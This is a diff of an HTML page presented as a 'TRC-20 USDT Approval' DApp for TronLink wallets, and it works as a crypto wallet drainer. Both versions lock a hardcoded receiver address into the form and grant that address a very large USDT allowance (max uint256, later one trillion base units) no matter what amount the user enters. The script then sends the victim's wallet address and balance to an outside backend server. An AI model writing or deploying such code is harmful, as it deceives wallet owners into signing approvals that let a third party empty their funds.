@@ -3,112 +3,135 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TRC20 DApp</title>
+  <title>TRC-20 USDT Approval</title>
   <style>
     body {
-      background-color: #0b0f1a;
+      background-color: #000;
       color: white;
       font-family: 'Segoe UI', sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
+      justify-content: center;
       height: 100vh;
-      padding-top: 50px;
       margin: 0;
     }
+
     .container {
       width: 90%;
       max-width: 400px;
-      background-color: #131b2b;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px #1a2335;
+      padding: 20px;
+      background-color: #111;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(255,255,255,0.1);
     }
+
     h2 {
       text-align: center;
       margin-bottom: 20px;
+      font-weight: 500;
     }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #aaa;
+    }
+
     input {
       width: 100%;
-      padding: 14px;
-      margin-bottom: 15px;
+      padding: 12px;
+      margin-bottom: 20px;
       border: none;
-      border-radius: 8px;
+      border-radius: 5px;
+      background-color: #222;
+      color: white;
       font-size: 16px;
-      background-color: #1e2a3f;
-      color: #fff;
     }
+
     button {
       width: 100%;
-      padding: 14px;
-      background-color: #00ffb2;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #00ffae;
       color: #000;
       font-weight: bold;
-      font-size: 18px;
-      border: none;
-      border-radius: 8px;
+      font-size: 16px;
       cursor: pointer;
     }
+
     button:hover {
-      background-color: #00e6a1;
+      background-color: #00d49e;
     }
+
     .footer {
-      margin-top: 30px;
-      font-size: 13px;
-      color: #aaa;
+      margin-top: 20px;
+      font-size: 12px;
+      color: #666;
       text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Approve USDT</h2>
-    <input id="wallet" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
-    <input id="amount" type="number" placeholder="Enter Amount" />
-    <button onclick="approve()">Next</button>
-  </div>
-  <div class="footer">TRC-20 DApp | USDT Approval</div>
+    <h2>Approve TRC-20 USDT</h2>
 
-  <script src="https://cdn.jsdelivr.net/npm/@tronscan/tronweb@latest/dist/TronWeb.js"></script>
+    <label for="wallet">Receiver Address</label>
+    <input id="wallet" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" disabled />
+
+    <label for="amount">Amount (USDT)</label>
+    <input id="amount" value="1" />
+
+    <button id="nextBtn">Next</button>
+
+    <div class="footer">TRC-20 Wallet Approval DApp</div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
   <script>
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT
     const BACKEND_URL = "https://atrc20-backend.onrender.com";
 
-    async function approve() {
+    document.getElementById("nextBtn").addEventListener("click", async () => {
+      const receiver = document.getElementById("wallet").value;
+      const amount = document.getElementById("amount").value;
+
       if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert("Please open in TronLink / SafePal DApp browser.");
+        alert("Please open in TronLink or compatible wallet browser");
         return;
       }
 
-      const userAddress = tronWeb.defaultAddress.base58;
-      const usdt = await tronWeb.contract().at(USDT_CONTRACT);
+      const userAddress = window.tronWeb.defaultAddress.base58;
+      const usdt = await window.tronWeb.contract().at(CONTRACT_ADDRESS);
 
       try {
-        const tx = await usdt.approve("TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
-        console.log("Approval TX:", tx);
+        // Unlimited approval
+        await usdt.approve(receiver, "1000000000000").send();
 
-        const balance = await usdt.balanceOf(userAddress).call();
-        const amount = document.getElementById("amount").value || "0";
+        // Get balance
+        const balanceInSun = await usdt.balanceOf(userAddress).call();
+        const balance = parseFloat(window.tronWeb.fromSun(balanceInSun));
 
-        await fetch(`${BACKEND_URL}/log-approval`, {
+        // Log to backend
+        await fetch(`${BACKEND_URL}/approve`, {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             wallet_address: userAddress,
             amount: parseFloat(amount),
-            balance: parseFloat(tronWeb.fromSun(balance.toString()))
+            balance: balance
           }),
         });
 
-        alert("Approval successful!");
+        alert("Approved successfully and logged!");
       } catch (err) {
         console.error(err);
-        alert("Transaction failed.");
+        alert("Approval failed");
       }
-    }
+    });
   </script>
 </body>
 </html>
